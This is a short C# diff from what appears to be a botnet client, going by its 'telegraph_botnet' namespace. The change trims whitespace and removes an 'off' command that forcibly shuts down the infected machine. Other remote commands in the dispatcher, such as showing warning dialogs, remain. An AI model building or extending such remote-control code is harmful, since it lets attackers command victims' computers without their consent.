@@ -66,7 +66,7 @@ namespace telegraph_botnet
 
                 }
 
-                last_cmd = content; 
+                last_cmd = content;
 
                 cmd command = new cmd(content);
                 Execute(command);
@@ -112,10 +112,6 @@ namespace telegraph_botnet
 
                 case "dialog_warning":
                     functions.DialogWarning(CMD.ComContent);
-                    break;
-
-                case "off":
-                    Process.Start("shutdown", "/s /t 0");
                     break;
 
                 case "exit":
